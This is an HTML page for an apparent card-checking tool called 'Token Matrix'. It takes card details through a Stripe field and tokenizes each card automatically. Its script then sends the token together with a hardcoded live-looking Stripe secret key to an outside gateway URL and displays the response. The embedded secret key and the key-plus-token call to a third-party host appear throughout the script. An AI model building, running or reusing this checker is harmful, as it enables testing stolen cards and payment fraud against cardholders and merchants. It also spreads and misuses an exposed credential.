<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Token Matrix</title>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    :root {
      --bg: #0d1117;
      --card: #161b22;
      --text: #c9d1d9;
      --neon-green: #00ff00;
      --neon-purple: #ff00ff;
      --border: #30363d;
      --shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
      --radius: 8px;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'IBM Plex Mono', monospace;
      background: var(--bg);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow: hidden;
    }
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 255, 0, 0.1) 0px,
        rgba(0, 255, 0, 0.1) 1px,
        transparent 1px,
        transparent 40px
      );
      animation: matrix-rain 15s linear infinite;
      z-index: -1;
      opacity: 0.7;
    }
    @keyframes matrix-rain {
      0% { transform: translateY(0); }
      100% { transform: translateY(40px); }
    }
    .card {
      width: 100%;
      max-width: 960px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow), 0 0 20px rgba(0, 255, 0, 0.3);
      padding: 24px;
      display: grid;
      grid-template-columns: 1fr 2fr;
      gap: 24px;
      z-index: 1;
    }
    .panel { padding: 8px; }
    .form-card {
      background: #1c2526;
      border: 1px solid var(--neon-green);
      border-radius: var(--radius);
      padding: 16px;
      box-shadow: 0 0 12px var(--neon-green);
    }
    .stripe-element {
      padding: 12px;
      border: 1px solid var(--neon-purple);
      border-radius: 6px;
      background: #0d1117;
      color: var(--text);
    }
    .actions {
      margin-top: 12px;
      display: flex;
      justify-content: flex-end;
    }
    .btn {
      background: linear-gradient(90deg, var(--neon-green), var(--neon-purple));
      color: #000;
      border: none;
      padding: 8px 16px;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
      text-transform: uppercase;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 0 15px var(--neon-green), 0 0 15px var(--neon-purple);
    }
    .btn.secondary {
      background: transparent;
      border: 1px solid var(--neon-green);
      color: var(--neon-green);
    }
    .btn[disabled] {
      opacity: 0.4;
      cursor: not-allowed;
    }
    .right-panel {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
      background: #1c2526;
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 16px;
      box-shadow: 0 0 12px var(--neon-purple);
    }
    .sub-panel {
      display: flex;
      flex-direction: column;
    }
    .sub-panel-title {
      font-size: 14px;
      font-weight: 600;
      color: var(--neon-green);
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 1px;
      text-shadow: 0 0 5px var(--neon-green);
    }
    .result {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 12px;
      background: #0d1117;
      color: var(--text);
      padding: 12px;
      border: 1px solid var(--neon-purple);
      border-radius: 6px;
      overflow: auto;
      max-height: 400px;
      white-space: pre-wrap;
      flex: 1;
      box-shadow: inset 0 0 5px rgba(255, 0, 255, 0.2);
    }
    footer {
      margin-top: auto;
      padding: 16px 0;
      text-align: center;
      width: 100%;
      z-index: 1;
      position: absolute;
      bottom: 0;
      left: 0;
    }
    .developed-by {
      font-size: 16px;
      color: var(--neon-purple);
      text-shadow: 0 0 8px var(--neon-purple), 0 0 16px var(--neon-purple);
      margin-bottom: 4px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }
    .copyright {
      font-size: 10px;
      color: var(--text);
      opacity: 0.7;
    }
    @media (max-width: 768px) {
      .card { grid-template-columns: 1fr; }
      .right-panel { grid-template-columns: 1fr; gap: 12px; }
    }
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="panel">
      <div class="form-card">
        <div id="card-element" class="stripe-element"></div>
        <div class="actions">
          <button id="clearBtn" class="btn secondary">X</button>
        </div>
      </div>
    </div>
    <div class="panel right-panel">
      <div class="sub-panel">
        <div class="sub-panel-title">Token</div>
        <div id="token-result" class="result"></div>
      </div>
      <div class="sub-panel">
        <div class="sub-panel-title">API Response</div>
        <div id="result" class="result"></div>
      </div>
    </div>
  </div>
  <footer>
    <div class="developed-by">Developed by Kali Linux</div>
    <div class="copyright">Â© All Rights Reserved</div>
  </footer>
  <script>
    (async () => {
      const API_ENDPOINT_BASE = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
      const SK_KEY = "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";
      const PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
      const clearBtn = document.getElementById('clearBtn');
      const tokenResultEl = document.getElementById('token-result');
      const resultEl = document.getElementById('result');
      let stripe = null;
      let elements = null;
      let card = null;

      function setTokenResult(text) { tokenResultEl.textContent = text; }
      function setHtmlTokenResult(obj) { tokenResultEl.textContent = JSON.stringify(obj, null, 2); }
      function setResult(text) { resultEl.textContent = text; }
      function setHtmlResult(obj) { resultEl.textContent = JSON.stringify(obj, null, 2); }

      function initStripe() {
        if (card) { card.unmount(); card = null; elements = null; stripe = null; }
        try {
          stripe = Stripe(PK);
          elements = stripe.elements();
          const style = {
            base: {
              fontFamily: '"IBM Plex Mono", monospace',
              fontSize: '14px',
              color: 'var(--neon-green)',
              '::placeholder': { color: '#6b7280' },
              lineHeight: '24px'
            },
            invalid: {
              color: '#ff5555'
            }
          };
          card = elements.create('card', {
            style,
            hidePostalCode: true,
            classes: { base: 'stripe-element' }
          });
          card.mount('#card-element');
          card.on('change', async (e) => {
            if (e.error) {
              setTokenResult(e.error.message);
              setResult('');
            } else if (e.complete) {
              await tokenizeAndSend();
            } else {
              setTokenResult('');
              setResult('');
            }
          });
        } catch (err) {
          setTokenResult('Stripe init error: ' + err.message);
          setResult('');
        }
      }

      async function tokenizeAndSend() {
        if (!stripe || !card) {
          setTokenResult('Stripe not initialized');
          setResult('');
          return;
        }
        setTokenResult('Processing...');
        setResult('Processing...');
        const { token, error } = await stripe.createToken(card);
        if (error) {
          setTokenResult(error.message);
          setResult('');
          return;
        }
        setHtmlTokenResult(token);
        try {
          const url = `${API_ENDPOINT_BASE}?sk_key=${encodeURIComponent(SK_KEY)}&token=${encodeURIComponent(token.id)}`;
          const resp = await fetch(url, { method: "GET" });
          const text = await resp.text();
          try {
            const json = JSON.parse(text);
            setHtmlResult(json);
          } catch {
            setResult(text);
          }
        } catch (err) {
          setResult('API error: ' + err.message);
        }
      }

      initStripe();

      clearBtn.addEventListener('click', () => {
        initStripe();
        setTokenResult('');
        setResult('');
      });
    })();
  </script>
</body>
</html>
